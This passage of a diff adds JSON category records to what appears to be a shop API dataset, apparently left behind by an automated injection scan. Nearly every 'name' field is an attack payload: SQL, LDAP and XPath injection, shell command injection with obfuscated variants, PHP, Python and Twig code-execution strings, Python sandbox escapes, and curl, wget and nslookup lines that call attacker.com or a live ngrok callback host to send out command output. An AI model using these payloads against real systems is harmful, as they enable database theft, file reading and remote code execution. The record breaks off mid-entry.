+        "slug": "and",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:55.000Z",
+        "updatedAt": "2026-03-17T16:03:55.000Z"
+    },
+    {
+        "id": 502,
+        "name": "*)(telephoneNumber=*)",
+        "slug": "telephonenumber",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:55.000Z",
+        "updatedAt": "2026-03-17T16:03:55.000Z"
+    },
+    {
+        "id": 503,
+        "name": "1' or '1",
+        "slug": "1-or-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:55.000Z",
+        "updatedAt": "2026-03-17T16:03:55.000Z"
+    },
+    {
+        "id": 504,
+        "name": "*))(objectClass=user",
+        "slug": "objectclass-user",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:56.000Z",
+        "updatedAt": "2026-03-17T16:03:56.000Z"
+    },
+    {
+        "id": 505,
+        "name": "invalid_function()",
+        "slug": "invalid-function",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:56.000Z",
+        "updatedAt": "2026-03-17T16:03:56.000Z"
+    },
+    {
+        "id": 506,
+        "name": "' or invalid()='",
+        "slug": "or-invalid",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:56.000Z",
+        "updatedAt": "2026-03-17T16:03:56.000Z"
+    },
+    {
+        "id": 507,
+        "name": "admin)(&(password=a*))",
+        "slug": "admin-password-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:56.000Z",
+        "updatedAt": "2026-03-17T16:03:56.000Z"
+    },
+    {
+        "id": 508,
+        "name": "' or 1=string('a')='",
+        "slug": "or-1-string-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:57.000Z",
+        "updatedAt": "2026-03-17T16:03:57.000Z"
+    },
+    {
+        "id": 509,
+        "name": "admin)(&(password=b*))",
+        "slug": "admin-password-b",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:57.000Z",
+        "updatedAt": "2026-03-17T16:03:57.000Z"
+    },
+    {
+        "id": 510,
+        "name": "' or number('x')=1 or '",
+        "slug": "or-number-x-1-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:57.000Z",
+        "updatedAt": "2026-03-17T16:03:57.000Z"
+    },
+    {
+        "id": 511,
+        "name": "' or //*[namespace-uri()='http://test']='",
+        "slug": "or-namespace-uri-http-test",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:57.000Z",
+        "updatedAt": "2026-03-17T16:03:57.000Z"
+    },
+    {
+        "id": 512,
+        "name": "' or exists(//*) or '",
+        "slug": "or-exists-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:58.000Z",
+        "updatedAt": "2026-03-17T16:03:58.000Z"
+    },
+    {
+        "id": 513,
+        "name": "' or doc('http://evil.com')='",
+        "slug": "or-doc-http-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:58.000Z",
+        "updatedAt": "2026-03-17T16:03:58.000Z"
+    },
+    {
+        "id": 514,
+        "name": "' or '1'='2",
+        "slug": "or-1-2",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:03:59.000Z",
+        "updatedAt": "2026-03-17T16:03:59.000Z"
+    },
+    {
+        "id": 515,
+        "name": "' or 1=2 or '",
+        "slug": "or-1-2-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:01.000Z",
+        "updatedAt": "2026-03-17T16:04:01.000Z"
+    },
+    {
+        "id": 516,
+        "name": "1 or 1=1",
+        "slug": "1-or-1-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:01.000Z",
+        "updatedAt": "2026-03-17T16:04:01.000Z"
+    },
+    {
+        "id": 517,
+        "name": "1 or 1=2",
+        "slug": "1-or-1-2",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:02.000Z",
+        "updatedAt": "2026-03-17T16:04:02.000Z"
+    },
+    {
+        "id": 518,
+        "name": "' or 'a'='a",
+        "slug": "or-a-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:02.000Z",
+        "updatedAt": "2026-03-17T16:04:02.000Z"
+    },
+    {
+        "id": 519,
+        "name": "' or 'a'='b",
+        "slug": "or-a-b",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:02.000Z",
+        "updatedAt": "2026-03-17T16:04:02.000Z"
+    },
+    {
+        "id": 520,
+        "name": "' or string-length('a')=1 or '",
+        "slug": "or-string-length-a-1-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:03.000Z",
+        "updatedAt": "2026-03-17T16:04:03.000Z"
+    },
+    {
+        "id": 521,
+        "name": "' or string-length('a')=2 or '",
+        "slug": "or-string-length-a-2-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:03.000Z",
+        "updatedAt": "2026-03-17T16:04:03.000Z"
+    },
+    {
+        "id": 522,
+        "name": "' or count(/*)>0 or '",
+        "slug": "or-count-0-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:03.000Z",
+        "updatedAt": "2026-03-17T16:04:03.000Z"
+    },
+    {
+        "id": 523,
+        "name": "' or count(/*)>999999 or '",
+        "slug": "or-count-999999-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:04.000Z",
+        "updatedAt": "2026-03-17T16:04:04.000Z"
+    },
+    {
+        "id": 524,
+        "name": "' or //* or '",
+        "slug": "or-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:04.000Z",
+        "updatedAt": "2026-03-17T16:04:04.000Z"
+    },
+    {
+        "id": 525,
+        "name": "' or /nonexistent or '",
+        "slug": "or-nonexistent-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:05.000Z",
+        "updatedAt": "2026-03-17T16:04:05.000Z"
+    },
+    {
+        "id": 526,
+        "name": "' or position()=1 or '",
+        "slug": "or-position-1-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:05.000Z",
+        "updatedAt": "2026-03-17T16:04:05.000Z"
+    },
+    {
+        "id": 527,
+        "name": "' or position()=999999 or '",
+        "slug": "or-position-999999-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:05.000Z",
+        "updatedAt": "2026-03-17T16:04:05.000Z"
+    },
+    {
+        "id": 528,
+        "name": "' or name()!='' or '",
+        "slug": "or-name-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:06.000Z",
+        "updatedAt": "2026-03-17T16:04:06.000Z"
+    },
+    {
+        "id": 529,
+        "name": "' or name()='nonexistent' or '",
+        "slug": "or-name-nonexistent-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:06.000Z",
+        "updatedAt": "2026-03-17T16:04:06.000Z"
+    },
+    {
+        "id": 530,
+        "name": "New category' or '1'='1",
+        "slug": "new-category-or-1-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:07.000Z",
+        "updatedAt": "2026-03-17T16:04:07.000Z"
+    },
+    {
+        "id": 531,
+        "name": "New category' or '1'='2",
+        "slug": "new-category-or-1-2",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:07.000Z",
+        "updatedAt": "2026-03-17T16:04:07.000Z"
+    },
+    {
+        "id": 532,
+        "name": "admin' or '1'='1' or 'x'='",
+        "slug": "admin-or-1-1-or-x",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:08.000Z",
+        "updatedAt": "2026-03-17T16:04:08.000Z"
+    },
+    {
+        "id": 533,
+        "name": "admin' or '1'='2' or 'x'='",
+        "slug": "admin-or-1-2-or-x",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:08.000Z",
+        "updatedAt": "2026-03-17T16:04:08.000Z"
+    },
+    {
+        "id": 534,
+        "name": "' or true() or '",
+        "slug": "or-true-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:09.000Z",
+        "updatedAt": "2026-03-17T16:04:09.000Z"
+    },
+    {
+        "id": 535,
+        "name": "' or false() or '",
+        "slug": "or-false-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:10.000Z",
+        "updatedAt": "2026-03-17T16:04:10.000Z"
+    },
+    {
+        "id": 536,
+        "name": "' or exists(/nonexistent) or '",
+        "slug": "or-exists-nonexistent-or",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:10.000Z",
+        "updatedAt": "2026-03-17T16:04:10.000Z"
+    },
+    {
+        "id": 537,
+        "name": "' or doc('https://uncloyed-eden-soughfully.ngrok-free.dev/i/ef49767090ce62cfb539')='",
+        "slug": "or-doc-https-uncloyed-eden-soughfully-ngrok-free-dev-i-ef49767090ce62cfb539",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:12.000Z",
+        "updatedAt": "2026-03-17T16:04:12.000Z"
+    },
+    {
+        "id": 538,
+        "name": "1) or doc('https://uncloyed-eden-soughfully.ngrok-free.dev/i/ef49767090ce62cfb539') or (1",
+        "slug": "1-or-doc-https-uncloyed-eden-soughfully-ngrok-free-dev-i-ef49767090ce62cfb539-or-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:12.000Z",
+        "updatedAt": "2026-03-17T16:04:12.000Z"
+    },
+    {
+        "id": 539,
+        "name": "' or unparsed-text('https://uncloyed-eden-soughfully.ngrok-free.dev/i/ef49767090ce62cfb539')='",
+        "slug": "or-unparsed-text-https-uncloyed-eden-soughfully-ngrok-free-dev-i-ef49767090ce62cfb539",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:13.000Z",
+        "updatedAt": "2026-03-17T16:04:13.000Z"
+    },
+    {
+        "id": 540,
+        "name": "' or saxon:parse('https://uncloyed-eden-soughfully.ngrok-free.dev/i/ef49767090ce62cfb539')='",
+        "slug": "or-saxon-parse-https-uncloyed-eden-soughfully-ngrok-free-dev-i-ef49767090ce62cfb539",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:04:13.000Z",
+        "updatedAt": "2026-03-17T16:04:13.000Z"
+    },
+    {
+        "id": 541,
+        "name": ";id",
+        "slug": "id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:13.000Z",
+        "updatedAt": "2026-03-17T16:05:13.000Z"
+    },
+    {
+        "id": 542,
+        "name": ";whoami",
+        "slug": "whoami",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:16.000Z",
+        "updatedAt": "2026-03-17T16:05:16.000Z"
+    },
+    {
+        "id": 543,
+        "name": "| dir",
+        "slug": "dir",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:17.000Z",
+        "updatedAt": "2026-03-17T16:05:17.000Z"
+    },
+    {
+        "id": 544,
+        "name": ";cat /etc/passwd",
+        "slug": "cat-etc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:18.000Z",
+        "updatedAt": "2026-03-17T16:05:18.000Z"
+    },
+    {
+        "id": 545,
+        "name": "& type C:\\Windows\\win.ini",
+        "slug": "type-c-windows-win-ini",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:19.000Z",
+        "updatedAt": "2026-03-17T16:05:19.000Z"
+    },
+    {
+        "id": 546,
+        "name": ";sleep 5",
+        "slug": "sleep-5",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:19.000Z",
+        "updatedAt": "2026-03-17T16:05:19.000Z"
+    },
+    {
+        "id": 547,
+        "name": "& ping -n 5 127.0.0.1",
+        "slug": "ping-n-5-127-0-0-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:20.000Z",
+        "updatedAt": "2026-03-17T16:05:20.000Z"
+    },
+    {
+        "id": 548,
+        "name": ";ping -c 5 127.0.0.1",
+        "slug": "ping-c-5-127-0-0-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:20.000Z",
+        "updatedAt": "2026-03-17T16:05:20.000Z"
+    },
+    {
+        "id": 549,
+        "name": ";curl http://attacker.com/?x=$(whoami)",
+        "slug": "curl-http-attacker-com-x-whoami",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:21.000Z",
+        "updatedAt": "2026-03-17T16:05:21.000Z"
+    },
+    {
+        "id": 550,
+        "name": ";wget http://attacker.com/?x=$(id)",
+        "slug": "wget-http-attacker-com-x-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:22.000Z",
+        "updatedAt": "2026-03-17T16:05:22.000Z"
+    },
+    {
+        "id": 551,
+        "name": "|nslookup attacker.com",
+        "slug": "nslookup-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:22.000Z",
+        "updatedAt": "2026-03-17T16:05:22.000Z"
+    },
+    {
+        "id": 552,
+        "name": "%0aid",
+        "slug": "0aid",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:22.000Z",
+        "updatedAt": "2026-03-17T16:05:22.000Z"
+    },
+    {
+        "id": 553,
+        "name": "%0awhoami",
+        "slug": "0awhoami",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:23.000Z",
+        "updatedAt": "2026-03-17T16:05:23.000Z"
+    },
+    {
+        "id": 554,
+        "name": "a]|id",
+        "slug": "a-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:24.000Z",
+        "updatedAt": "2026-03-17T16:05:24.000Z"
+    },
+    {
+        "id": 555,
+        "name": ";/???/??t /???/p??s??",
+        "slug": "t-p-s",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:26.000Z",
+        "updatedAt": "2026-03-17T16:05:26.000Z"
+    },
+    {
+        "id": 556,
+        "name": ";/???/b??/w?o?m?",
+        "slug": "b-w-o-m",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:27.000Z",
+        "updatedAt": "2026-03-17T16:05:27.000Z"
+    },
+    {
+        "id": 557,
+        "name": ";$'\\x69\\x64'",
+        "slug": "x69-x64",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:27.000Z",
+        "updatedAt": "2026-03-17T16:05:27.000Z"
+    },
+    {
+        "id": 558,
+        "name": ";$(printf '\\x69\\x64')",
+        "slug": "printf-x69-x64",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:27.000Z",
+        "updatedAt": "2026-03-17T16:05:27.000Z"
+    },
+    {
+        "id": 559,
+        "name": ";i]d",
+        "slug": "i-d",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:27.000Z",
+        "updatedAt": "2026-03-17T16:05:27.000Z"
+    },
+    {
+        "id": 560,
+        "name": "${IFS}id",
+        "slug": "ifs-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:28.000Z",
+        "updatedAt": "2026-03-17T16:05:28.000Z"
+    },
+    {
+        "id": 561,
+        "name": ";id${IFS}",
+        "slug": "id-ifs",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:28.000Z",
+        "updatedAt": "2026-03-17T16:05:28.000Z"
+    },
+    {
+        "id": 562,
+        "name": ";cat$IFS/etc/passwd",
+        "slug": "cat-ifs-etc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:29.000Z",
+        "updatedAt": "2026-03-17T16:05:29.000Z"
+    },
+    {
+        "id": 563,
+        "name": "| bash -c 'id'",
+        "slug": "bash-c-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:30.000Z",
+        "updatedAt": "2026-03-17T16:05:30.000Z"
+    },
+    {
+        "id": 564,
+        "name": "| sh -c 'id'",
+        "slug": "sh-c-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:30.000Z",
+        "updatedAt": "2026-03-17T16:05:30.000Z"
+    },
+    {
+        "id": 565,
+        "name": "| powershell -c whoami",
+        "slug": "powershell-c-whoami",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:30.000Z",
+        "updatedAt": "2026-03-17T16:05:30.000Z"
+    },
+    {
+        "id": 566,
+        "name": ";rev<<<'di'|bash",
+        "slug": "rev-di-bash",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:31.000Z",
+        "updatedAt": "2026-03-17T16:05:31.000Z"
+    },
+    {
+        "id": 567,
+        "name": ";base64 -d<<<'aWQ='|bash",
+        "slug": "base64-d-awq-bash",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:31.000Z",
+        "updatedAt": "2026-03-17T16:05:31.000Z"
+    },
+    {
+        "id": 569,
+        "name": "; curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/baf296b635e39c08b543/cmdi #",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-baf296b635e39c08b543-cmdi",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:35.000Z",
+        "updatedAt": "2026-03-17T16:05:35.000Z"
+    },
+    {
+        "id": 570,
+        "name": "; wget -q https://uncloyed-eden-soughfully.ngrok-free.dev/i/baf296b635e39c08b543/cmdi -O /dev/null #",
+        "slug": "wget-q-https-uncloyed-eden-soughfully-ngrok-free-dev-i-baf296b635e39c08b543-cmdi-o-dev-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:37.000Z",
+        "updatedAt": "2026-03-17T16:05:37.000Z"
+    },
+    {
+        "id": 571,
+        "name": "& nslookup uncloyed-eden-soughfully.ngrok-free.dev &",
+        "slug": "nslookup-uncloyed-eden-soughfully-ngrok-free-dev",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:37.000Z",
+        "updatedAt": "2026-03-17T16:05:37.000Z"
+    },
+    {
+        "id": 572,
+        "name": "' UNION SELECT NULL--",
+        "slug": "union-select-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:55.000Z",
+        "updatedAt": "2026-03-17T16:05:55.000Z"
+    },
+    {
+        "id": 573,
+        "name": "' UNION SELECT NULL,NULL--",
+        "slug": "union-select-null-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:55.000Z",
+        "updatedAt": "2026-03-17T16:05:55.000Z"
+    },
+    {
+        "id": 574,
+        "name": "' UNION SELECT NULL,NULL,NULL--",
+        "slug": "union-select-null-null-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:56.000Z",
+        "updatedAt": "2026-03-17T16:05:56.000Z"
+    },
+    {
+        "id": 575,
+        "name": "' UNION SELECT 1,2,3--",
+        "slug": "union-select-1-2-3",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:56.000Z",
+        "updatedAt": "2026-03-17T16:05:56.000Z"
+    },
+    {
+        "id": 576,
+        "name": "' UNION SELECT username,password FROM users--",
+        "slug": "union-select-username-password-from-users",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:56.000Z",
+        "updatedAt": "2026-03-17T16:05:56.000Z"
+    },
+    {
+        "id": 577,
+        "name": "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
+        "slug": "union-all-select-null-null-null-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:57.000Z",
+        "updatedAt": "2026-03-17T16:05:57.000Z"
+    },
+    {
+        "id": 578,
+        "name": "1' AND '1'='1",
+        "slug": "1-and-1-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:58.000Z",
+        "updatedAt": "2026-03-17T16:05:58.000Z"
+    },
+    {
+        "id": 579,
+        "name": "1' AND '1'='2",
+        "slug": "1-and-1-2",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:58.000Z",
+        "updatedAt": "2026-03-17T16:05:58.000Z"
+    },
+    {
+        "id": 580,
+        "name": "1' AND '1'='2 AND 1=0",
+        "slug": "1-and-1-2-and-1-0",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:05:59.000Z",
+        "updatedAt": "2026-03-17T16:05:59.000Z"
+    },
+    {
+        "id": 581,
+        "name": "; id #;echo SO2ND_command_injection_c05b1e85;",
+        "slug": "id-echo-so2nd-command-injection-c05b1e85",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:06:23.000Z",
+        "updatedAt": "2026-03-17T16:06:23.000Z"
+    },
+    {
+        "id": 582,
+        "name": "' OR '1'='1/*SO2ND_sqli_b5c4a063*/",
+        "slug": "or-1-1-so2nd-sqli-b5c4a063",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:06:36.000Z",
+        "updatedAt": "2026-03-17T16:06:36.000Z"
+    },
+    {
+        "id": 583,
+        "name": "; curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/4500359ff4e7283e7904/rce #",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-4500359ff4e7283e7904-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:21.000Z",
+        "updatedAt": "2026-03-17T16:07:21.000Z"
+    },
+    {
+        "id": 584,
+        "name": "; wget -q https://uncloyed-eden-soughfully.ngrok-free.dev/i/4500359ff4e7283e7904/rce -O /dev/null #",
+        "slug": "wget-q-https-uncloyed-eden-soughfully-ngrok-free-dev-i-4500359ff4e7283e7904-rce-o-dev-null",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:23.000Z",
+        "updatedAt": "2026-03-17T16:07:23.000Z"
+    },
+    {
+        "id": 585,
+        "name": "__import__('os').popen('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/4500359ff4e7283e7904/rce').read()",
+        "slug": "import-os-popen-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-4500359ff4e7283e7904-rce-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:23.000Z",
+        "updatedAt": "2026-03-17T16:07:23.000Z"
+    },
+    {
+        "id": 586,
+        "name": "require('child_process').execSync('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/4500359ff4e7283e7904/rce')",
+        "slug": "require-child-process-execsync-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-4500359ff4e7283e7904-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:24.000Z",
+        "updatedAt": "2026-03-17T16:07:24.000Z"
+    },
+    {
+        "id": 587,
+        "name": "<?php system('curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/4500359ff4e7283e7904/rce'); ?>",
+        "slug": "php-system-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-4500359ff4e7283e7904-rce",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:24.000Z",
+        "updatedAt": "2026-03-17T16:07:24.000Z"
+    },
+    {
+        "id": 588,
+        "name": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "slug": "self-env-registerundefinedfiltercallback-exec-self-env-getfilter-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:36.000Z",
+        "updatedAt": "2026-03-17T16:07:36.000Z"
+    },
+    {
+        "id": 589,
+        "name": "{{['id']|filter('system')}}",
+        "slug": "id-filter-system",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:36.000Z",
+        "updatedAt": "2026-03-17T16:07:36.000Z"
+    },
+    {
+        "id": 590,
+        "name": "{{['cat /etc/passwd']|filter('exec')}}",
+        "slug": "cat-etc-passwd-filter-exec",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:37.000Z",
+        "updatedAt": "2026-03-17T16:07:37.000Z"
+    },
+    {
+        "id": 591,
+        "name": "<?php system('id'); ?>",
+        "slug": "php-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:37.000Z",
+        "updatedAt": "2026-03-17T16:07:37.000Z"
+    },
+    {
+        "id": 592,
+        "name": "<?php exec('id'); ?>",
+        "slug": "php-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:38.000Z",
+        "updatedAt": "2026-03-17T16:07:38.000Z"
+    },
+    {
+        "id": 593,
+        "name": "<?php passthru('id'); ?>",
+        "slug": "php-passthru-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:38.000Z",
+        "updatedAt": "2026-03-17T16:07:38.000Z"
+    },
+    {
+        "id": 594,
+        "name": "<?php shell_exec('id'); ?>",
+        "slug": "php-shell-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:38.000Z",
+        "updatedAt": "2026-03-17T16:07:38.000Z"
+    },
+    {
+        "id": 595,
+        "name": "<?php popen('id', 'r'); ?>",
+        "slug": "php-popen-id-r",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:39.000Z",
+        "updatedAt": "2026-03-17T16:07:39.000Z"
+    },
+    {
+        "id": 596,
+        "name": "<?php proc_open('id', [], $pipes); ?>",
+        "slug": "php-proc-open-id-pipes",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:39.000Z",
+        "updatedAt": "2026-03-17T16:07:39.000Z"
+    },
+    {
+        "id": 597,
+        "name": "<?php assert('system(\"id\")'); ?>",
+        "slug": "php-assert-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:40.000Z",
+        "updatedAt": "2026-03-17T16:07:40.000Z"
+    },
+    {
+        "id": 598,
+        "name": "<?php preg_replace('/.*/e', 'system(\"id\")', ''); ?>",
+        "slug": "php-preg-replace-e-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:40.000Z",
+        "updatedAt": "2026-03-17T16:07:40.000Z"
+    },
+    {
+        "id": 599,
+        "name": "<?php create_function('', 'system(\"id\");')(); ?>",
+        "slug": "php-create-function-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:41.000Z",
+        "updatedAt": "2026-03-17T16:07:41.000Z"
+    },
+    {
+        "id": 600,
+        "name": "<?php array_map('system', ['id']); ?>",
+        "slug": "php-array-map-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:41.000Z",
+        "updatedAt": "2026-03-17T16:07:41.000Z"
+    },
+    {
+        "id": 601,
+        "name": "<?php call_user_func('system', 'id'); ?>",
+        "slug": "php-call-user-func-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:41.000Z",
+        "updatedAt": "2026-03-17T16:07:41.000Z"
+    },
+    {
+        "id": 602,
+        "name": "<?php eval('system(\"id\");'); ?>",
+        "slug": "php-eval-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:42.000Z",
+        "updatedAt": "2026-03-17T16:07:42.000Z"
+    },
+    {
+        "id": 603,
+        "name": "import os; os.system('id')",
+        "slug": "import-os-os-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:43.000Z",
+        "updatedAt": "2026-03-17T16:07:43.000Z"
+    },
+    {
+        "id": 604,
+        "name": "import os; os.popen('id').read()",
+        "slug": "import-os-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:43.000Z",
+        "updatedAt": "2026-03-17T16:07:43.000Z"
+    },
+    {
+        "id": 605,
+        "name": "import subprocess; subprocess.call(['id'])",
+        "slug": "import-subprocess-subprocess-call-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:43.000Z",
+        "updatedAt": "2026-03-17T16:07:43.000Z"
+    },
+    {
+        "id": 606,
+        "name": "__import__('os').system('id')",
+        "slug": "import-os-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:44.000Z",
+        "updatedAt": "2026-03-17T16:07:44.000Z"
+    },
+    {
+        "id": 607,
+        "name": "eval(compile('import os; os.system(\"id\")', '<string>', 'exec'))",
+        "slug": "eval-compile-import-os-os-system-id-string-exec",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:44.000Z",
+        "updatedAt": "2026-03-17T16:07:44.000Z"
+    },
+    {
+        "id": 608,
+        "name": "exec('import os; os.system(\"id\")')",
+        "slug": "exec-import-os-os-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:45.000Z",
+        "updatedAt": "2026-03-17T16:07:45.000Z"
+    },
+    {
+        "id": 609,
+        "name": "().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('id')",
+        "slug": "class-bases-0-subclasses-59-init-globals-sys-modules-os-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:45.000Z",
+        "updatedAt": "2026-03-17T16:07:45.000Z"
+    },
+    {
+        "id": 610,
+        "name": "''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()",
